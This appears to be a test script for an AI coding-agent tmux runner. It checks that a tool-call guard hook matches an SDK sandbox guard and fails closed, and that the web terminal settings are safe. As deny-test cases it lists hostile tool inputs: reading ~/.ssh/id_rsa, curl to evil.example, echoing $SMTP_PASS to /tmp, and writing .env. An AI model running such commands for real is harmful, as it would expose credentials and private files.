/**
 * Tests for the attachable build terminal (`src/agents/tmuxRuntime.ts`,
 * `src/agents/guardHook.ts`, `src/agents/terminalServer.ts`).
 *
 * Two halves, and the split is deliberate:
 *
 *  1. **Offline** — everything that can be checked without tmux, a subscription
 *     window or a network: the guard hook's stdin/stdout contract and its
 *     agreement with the SDK guard, the ttyd argv's safety properties, prompt
 *     file handling, the stale-marker rule. These are the parts that fail
 *     silently in production (a guard that fails open denies nothing and says
 *     nothing), so they are asserted rather than assumed.
 *
 *  2. **Live** (`--live`) — an actual tmux session running the actual `claude`
 *     CLI on a trivial task, end to end: session comes up, prompt file is read,
 *     result.json is written and validates, scrollback is captured, session is
 *     cleaned up. This spends a small amount of subscription budget, which is
 *     why it is opt-in; but it is the only thing that proves the runner works,
 *     because every hard part here (send-keys timing, TUI startup, completion
 *     detection) is invisible to a unit test.
 *
 *   pnpm tsx scripts/test-tmux-agent.ts           # offline only
 *   pnpm tsx scripts/test-tmux-agent.ts --live    # + one real agent session
 */
import { spawn } from 'node:child_process';
import { existsSync } from 'node:fs';
import { mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { z } from 'zod';
import { evaluateToolCall } from '../src/agents/sandbox.js';
import {
  PROMPT_FILE, STALE_MARKER_MS, TERMINAL_LOG, TERMINAL_MARKER,
  kickoffLine, liveTerminal, runCodeAgentTmux,
  sessionName, terminalFailureError, tmuxAvailable,
  isPermissionPrompt,
  isSandboxDead,
} from '../src/agents/tmuxRuntime.js';
import { shouldUseAttachableTerminal, getRuntimeById } from '../src/agents/runtime.js';
import { prepareCodeAgentInvocation } from '../src/agents/result.js';
import { preTrustWorkspace, guardSettings, guardHookPath } from '../src/agents/claudeCodeRuntime.js';
import { TERMINAL_USER, terminalPassword, ttydArgs } from '../src/agents/terminalServer.js';
import { RateLimitedError } from '../src/agents/types.js';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const GUARD_HOOK = path.resolve(HERE, '..', 'src', 'agents', 'guardHook.ts');
const TSX = path.resolve(HERE, '..', 'node_modules', '.bin', 'tsx');

let failures = 0;

function check(name: string, cond: boolean, detail?: string): void {
  if (cond) {
    console.log(`  ok   ${name}`);
  } else {
    failures++;
    console.log(`  FAIL ${name}${detail ? ` — ${detail}` : ''}`);
  }
}

const tmp = await mkdtemp(path.join(tmpdir(), 'factory-tmux-'));

// ─── 0. Runtime parity: terminal mode means terminal mode for every CLI ────

console.log('\nRuntime parity');
{
  check(
    'terminal mode enables the attachable path for the selected CLI',
    shouldUseAttachableTerminal({}, 'tmux'),
  );
  check(
    'an explicit terminal:true overrides headless mode',
    shouldUseAttachableTerminal({ terminal: true }, 'sdk'),
  );
  check(
    'an explicit terminal:false disables either runtime',
    !shouldUseAttachableTerminal({ terminal: false }, 'tmux'),
  );

  const opts = { name: 'terminal-parity', cwd: '/tmp/site-42', prompt: 'fixture', heavy: true };
  const codex = getRuntimeById('codex').terminalLaunch(opts, { settingsPath: '/tmp/factory-settings.json' });
  check('Codex terminal launches codex exec',
    codex.args[0] === 'exec' && codex.args.includes('workspace-write'), codex.args.join(' '));
  check('Codex starts work immediately instead of waiting for Claude TUI input', !codex.needsKickoff);
  check('Codex terminal is spectator-only', !codex.interactive);
  check('Codex receives the short prompt-file instruction',
    codex.args.includes(kickoffLine(PROMPT_FILE)), codex.args.join(' '));

  const claude = getRuntimeById('claude-code').terminalLaunch(opts, { settingsPath: '/tmp/factory-settings.json' });
  check('Claude terminal still launches its interactive TUI',
    claude.command === 'claude' && claude.needsKickoff && claude.interactive,
    `${claude.command} ${claude.args.join(' ')}`);
  // CLI 2.1.239 forces default mode under CLAUDE_CODE_SUBPROCESS_ENV_SCRUB;
  // the tools must be declared or every Write asks a question nobody answers.
  const allowedAt = claude.args.indexOf('--allowedTools');
  const disallowedAt = claude.args.indexOf('--disallowedTools');
  const allowed = claude.args.slice(allowedAt + 1, disallowedAt);
  check('Claude terminal declares its tools explicitly',
    allowedAt > 0 && ['Bash', 'Read', 'Write', 'Edit', 'Skill', 'Agent'].every((t) => allowed.includes(t)),
    claude.args.join(' '));
  check('interactive-only tools are disallowed outright',
    disallowedAt > allowedAt && claude.args.slice(disallowedAt + 1).includes('AskUserQuestion'));
  check('kickoff recognises the default-mode footer as ready',
    new RegExp(claude.kickoffReadyPattern!, 'i').test('⏸ manual mode on · ? for shortcuts · ← for agents')
    && new RegExp(claude.kickoffReadyPattern!, 'i').test('⏵⏵ bypass permissions on (shift+tab to cycle)'));
  check('a permission dialog on screen is recognised',
    isPermissionPrompt(' Do you want to overwrite layout.tsx?\n ❯ 1. Yes\n   2. Yes, and switch to accept edits\n   3. No\n Esc to cancel · Tab to amend'));
  check('a working pane is not a dialog',
    !isPermissionPrompt('✶ Bloviating… (23s · ↓ 1.0k tokens)\n❯ \n⏸ manual mode on · esc to interrupt'));
  const stuck = terminalFailureError(getRuntimeById('claude-code'), {
    reason: 'prompt', scrollback: 'Do you want to overwrite layout.tsx?', elapsedMs: 95_000,
  }, 'terminal-parity');
  check('a dialog failure names the fix', /TERMINAL_ALLOWED_TOOLS/.test(stuck.message), stuck.message);
  check('a dead CLI sandbox is recognised on screen',
    isSandboxDead("  ⎿  Sandbox is required but failed to initialize: Failed to create bridge sockets after 5 attempts. Restart to retry.")
    && !isSandboxDead('● Running pnpm build in the sandbox…'));
  const dead = terminalFailureError(getRuntimeById('claude-code'), {
    reason: 'sandbox', scrollback: 'Sandbox is required but failed to initialize', elapsedMs: 40_000,
  }, 'terminal-parity');
  check('a dead-sandbox failure says a new session is the fix', /нову сесію/.test(dead.message), dead.message);
  check('guard hook path shares this module\'s extension (.ts under tsx, .js in dist)',
    guardHookPath().endsWith(`guardHook${path.extname(fileURLToPath(import.meta.url))}`) && existsSync(guardHookPath()),
    guardHookPath());

  const limited = terminalFailureError(getRuntimeById('codex'), {
    reason: 'gone', scrollback: "You've hit your usage limit. Try again later.", elapsedMs: 1_000,
  }, 'terminal-parity');
  check('Codex terminal rate limits pause instead of failing the build',
    limited instanceof RateLimitedError && limited.runtime === 'codex');

  const ordinary = terminalFailureError(getRuntimeById('codex'), {
    reason: 'gone', scrollback: 'unexpected CLI exit', elapsedMs: 1_000,
  }, 'terminal-parity');
  check('ordinary Codex terminal failures remain ordinary errors',
    !(ordinary instanceof RateLimitedError) && ordinary.message.includes('produced no result.json'));

  const claudeLimited = terminalFailureError(getRuntimeById('claude-code'), {
    reason: 'idle', scrollback: 'Claude usage limit reached. Please try again later.', elapsedMs: 1_000,
  }, 'terminal-parity');
  check('a Claude TUI printing its subscription cap also pauses instead of failing',
    claudeLimited instanceof RateLimitedError && claudeLimited.runtime === 'claude-code');
}

/** Run the guard hook exactly as the CLI would: JSON on stdin, JSON on stdout. */
function runGuardHook(workspace: string, payload: unknown): Promise<string> {
  return new Promise((resolve) => {
    const child = spawn(TSX, [GUARD_HOOK, workspace], { stdio: ['pipe', 'pipe', 'pipe'] });
    let out = '';
    child.stdout.on('data', (b: Buffer) => { out += b.toString(); });
    const timer = setTimeout(() => child.kill('SIGKILL'), 30_000);
    child.on('close', () => { clearTimeout(timer); resolve(out); });
    child.on('error', () => { clearTimeout(timer); resolve(''); });
    child.stdin.end(typeof payload === 'string' ? payload : JSON.stringify(payload));
  });
}

function isDeny(out: string): boolean {
  try {
    const parsed = JSON.parse(out) as {
      hookSpecificOutput?: { permissionDecision?: string; hookEventName?: string };
    };
    return parsed.hookSpecificOutput?.permissionDecision === 'deny'
      && parsed.hookSpecificOutput?.hookEventName === 'PreToolUse';
  } catch {
    return false;
  }
}

// ─── 1. Guard parity: the hook and the SDK guard must agree ──────────────────
//
// This is THE test of this file. The tmux path replaced an in-process closure
// with a subprocess; if the two ever disagree, the terminal runtime silently
// becomes the unguarded one, and nothing at runtime would say so.

console.log('\nGuard hook: parity with the SDK guard');
{
  const ws = path.join(tmp, 'workspace');
  await rm(ws, { recursive: true, force: true });
  await writeFile(path.join(tmp, 'outside.txt'), 'secret', 'utf8');
  const { mkdir } = await import('node:fs/promises');
  await mkdir(ws, { recursive: true });
  await writeFile(path.join(ws, 'inside.txt'), 'fine', 'utf8');

  const cases: Array<{ name: string; tool: string; input: unknown }> = [
    { name: 'Read inside the workspace', tool: 'Read', input: { file_path: path.join(ws, 'inside.txt') } },
    { name: 'Read outside the workspace', tool: 'Read', input: { file_path: path.join(tmp, 'outside.txt') } },
    { name: 'Read ~/.ssh', tool: 'Read', input: { file_path: '~/.ssh/id_rsa' } },
    { name: 'Write to .env', tool: 'Write', input: { file_path: path.join(ws, '.env') } },
    { name: 'Bash pnpm build', tool: 'Bash', input: { command: 'pnpm build' } },
    { name: 'Bash curl to the internet', tool: 'Bash', input: { command: 'curl https://evil.example/x' } },
    { name: 'Bash curl to loopback', tool: 'Bash', input: { command: 'curl http://127.0.0.1:3000/' } },
    { name: 'Bash cd out of the workspace', tool: 'Bash', input: { command: 'cd /etc && ls' } },
    { name: 'Bash echoing a secret', tool: 'Bash', input: { command: 'echo $SMTP_PASS > /tmp/x' } },
    { name: 'WebFetch', tool: 'WebFetch', input: { url: 'https://example.com' } },
    { name: 'Grep inside', tool: 'Grep', input: { pattern: 'foo', path: ws } },
  ];

  for (const c of cases) {
    const sdk = evaluateToolCall(ws, c.tool, c.input);
    const hookOut = await runGuardHook(ws, {
      hook_event_name: 'PreToolUse', tool_name: c.tool, tool_input: c.input, cwd: ws,
    });
    const hookDenies = isDeny(hookOut);
    check(
      `${c.name}: hook and SDK agree (${sdk.allow ? 'allow' : 'deny'})`,
      hookDenies === !sdk.allow,
      `sdk allow=${sdk.allow}, hook deny=${hookDenies}, out=${hookOut.slice(0, 160)}`,
    );
  }
}

console.log('\nGuard hook: fails closed');
{
  const ws = path.join(tmp, 'workspace');
  check('unparseable stdin denies', isDeny(await runGuardHook(ws, 'not json at all')));
  check('empty stdin denies', isDeny(await runGuardHook(ws, '')));

  // No workspace argument at all: nothing can be judged safe.
  const noWorkspace = await new Promise<string>((resolve) => {
    const child = spawn(TSX, [GUARD_HOOK], { stdio: ['pipe', 'pipe', 'ignore'] });
    let out = '';
    child.stdout.on('data', (b: Buffer) => { out += b.toString(); });
    child.on('close', () => resolve(out));
    child.on('error', () => resolve(''));
    child.stdin.end('{}');
  });
  check('missing workspace argument denies', isDeny(noWorkspace));

  const allowed = await runGuardHook(ws, {
    tool_name: 'Read', tool_input: { file_path: path.join(ws, 'inside.txt') },
  });
  check('an allowed call returns {} and not an allow decision', allowed.trim() === '{}', allowed.slice(0, 120));
}

// ─── 2. The settings wiring that arms that hook ──────────────────────────────

console.log('\nSession settings');
{
  const ws = path.join(tmp, 'work space with spaces');
  const settings = guardSettings(ws, TSX) as {
    hooks: { PreToolUse: Array<{ matcher: string; hooks: Array<{ type: string; command: string }> }> };
  };
  const entry = settings.hooks.PreToolUse[0]!;
  check('the guard matches every tool', entry.matcher === '*', entry.matcher);
  check('the hook is a command hook', entry.hooks[0]!.type === 'command');
  check(
    'a workspace path with spaces stays one argument',
    entry.hooks[0]!.command.includes(JSON.stringify(ws)),
    entry.hooks[0]!.command,
  );
  check('the hook points at guardHook.ts', entry.hooks[0]!.command.includes('guardHook.ts'));
}

// ─── 3. ttyd: the safety properties of the argv ──────────────────────────────

console.log('\nWeb terminal (ttyd)');
{
  const ro = ttydArgs('build-42', { port: 7681, password: 'secret', writable: false });
  check('read-only attach passes tmux -r', ro.join(' ').includes('attach -r -t build-42'), ro.join(' '));
  check('read-only does not pass --writable', !ro.includes('--writable'));
  check('basic auth is configured', ro.includes('-c') && ro.includes(`${TERMINAL_USER}:secret`));

  // `-o/--once` makes ttyd exit on the FIRST disconnect. During a 90-minute
  // build that means closing the tab once kills the terminal for good — the
  // exact feature being built. Same for a one-client cap: a stale websocket
  // would hold the only slot. Asserted because both read as sensible hardening.
  check('the terminal survives a closed tab (no --once)', !ro.includes('-o') && !ro.includes('--once'), ro.join(' '));
  check('reconnecting is not capped to one client', !ro.includes('-m') && !ro.includes('--max-clients'));
  check('scrollback is configured', ro.join(' ').includes('scrollback='), ro.join(' '));
  check('the tab is titled with the session', ro.join(' ').includes(`titleFixed=build-42`));

  const rw = ttydArgs('build-42', { port: 7681, password: 'secret', writable: true });
  check('writable attach drops -r', !rw.join(' ').includes('attach -r'), rw.join(' '));
  check('writable passes --writable', rw.includes('--writable'));

  check('no INTERNAL_API_KEY yields no password', terminalPassword('') === '');
  const pw = terminalPassword('some-internal-key');
  check('a password is derived, not the key itself', pw.length === 24 && pw !== 'some-internal-key', pw);
  check('derivation is stable', terminalPassword('some-internal-key') === pw);
  check('different keys give different passwords', terminalPassword('other-key') !== pw);
}

// ─── 4. Session naming, kickoff line, stale markers ──────────────────────────

console.log('\nSession bookkeeping');
{
  check('session name is derived from the project', sessionName(42) === 'build-42');
  check(
    'the kickoff line is short and names the prompt file',
    kickoffLine(PROMPT_FILE).length < 200 && kickoffLine(PROMPT_FILE).includes(PROMPT_FILE),
    kickoffLine(PROMPT_FILE),
  );
  check(
    'the kickoff line is a single line',
    !kickoffLine(PROMPT_FILE).includes('\n'),
  );

  const ws = await mkdtemp(path.join(tmp, 'marker-'));
  check('no marker means no live terminal', await liveTerminal(ws) === null);

  await writeFile(path.join(ws, TERMINAL_MARKER), JSON.stringify({
    session: 'build-7', served: true, writable: false,
    startedAt: new Date().toISOString(), heartbeatAt: new Date().toISOString(),
  }), 'utf8');
  const live = await liveTerminal(ws);
  check('a fresh marker reports a live terminal', live?.session === 'build-7');
  check('a marker preserves its effective write policy', live?.writable === false);

  await writeFile(path.join(ws, TERMINAL_MARKER), JSON.stringify({
    session: 'build-7', served: true,
    startedAt: new Date(Date.now() - 3 * STALE_MARKER_MS).toISOString(),
    heartbeatAt: new Date(Date.now() - 2 * STALE_MARKER_MS).toISOString(),
  }), 'utf8');
  check('a stale marker reports nothing', await liveTerminal(ws) === null);

  await writeFile(path.join(ws, TERMINAL_MARKER), '{ broken', 'utf8');
  check('a corrupt marker reports nothing', await liveTerminal(ws) === null);
}

// ─── 5. Live: one real agent session in one real tmux ────────────────────────

const liveRuntime = process.argv.includes('--live-codex') ? 'codex'
  : process.argv.includes('--live-opencode') ? 'opencode'
  : 'claude-code';
const wantsLive = process.argv.includes('--live') || liveRuntime !== 'claude-code';
console.log(`\nLive tmux run${wantsLive ? ` (${liveRuntime})` : ' (skipped; pass --live, --live-codex or --live-opencode)'}`);

if (wantsLive) {
  const available = await tmuxAvailable();
  if (!available) {
    failures++;
    console.log('  FAIL tmux is not installed — the live run cannot prove anything');
  } else {
    const ws = await mkdtemp(path.join(tmp, 'live-'));
    const session = `factory-test-${process.pid}`;
    const schema = z.object({ ok: z.boolean(), note: z.string() });

    console.log(`  .... running a real ${liveRuntime} session in tmux (${session}); this takes a minute`);
    const startedAt = Date.now();
    try {
      const invocation = await prepareCodeAgentInvocation(ws);
      const result = await runCodeAgentTmux(
        {
          name: 'tmux-selftest',
          cwd: ws,
          prompt:
            'Create a file named hello.txt in this directory containing exactly the word TEST. '
            + 'Then report that you did it. Do not create anything else.',
          timeoutMs: 8 * 60_000,
        },
        schema,
        session,
        getRuntimeById(liveRuntime),
        invocation,
      );
      const seconds = Math.round((Date.now() - startedAt) / 1000);
      check('the agent returned a schema-valid result', result.ok === true, JSON.stringify(result));

      const hello = await readFile(path.join(ws, 'hello.txt'), 'utf8').catch(() => '');
      check('the agent did the actual task', hello.trim() === 'TEST', JSON.stringify(hello));

      check('the prompt was delivered as a file', existsSync(path.join(ws, PROMPT_FILE)));

      const scrollback = await readFile(path.join(ws, TERMINAL_LOG), 'utf8').catch(() => '');
      check('the pane scrollback was captured', scrollback.length > 200, `${scrollback.length} bytes`);

      check('the marker was removed when the session ended', !existsSync(path.join(ws, TERMINAL_MARKER)));

      // The session must not outlive the run: a leaked session holds the name
      // and the next build for this project would collide with it.
      const stillThere = await new Promise<boolean>((resolve) => {
        const child = spawn('tmux', ['has-session', '-t', session], { stdio: 'ignore' });
        child.on('close', (code) => resolve(code === 0));
        child.on('error', () => resolve(false));
      });
      check('the tmux session was cleaned up', !stillThere);

      console.log(`  .... live run finished in ${seconds}s`);
    } catch (err) {
      failures++;
      console.log(`  FAIL the live tmux run threw — ${String((err as Error)?.message ?? err).slice(0, 500)}`);
      // Never leave a session behind, whatever happened.
      spawn('tmux', ['kill-session', '-t', session], { stdio: 'ignore' });
    }
  }
}

await rm(tmp, { recursive: true, force: true });

console.log(failures === 0 ? '\nAll checks passed.\n' : `\n${failures} check(s) FAILED.\n`);
process.exit(failures === 0 ? 0 : 1);
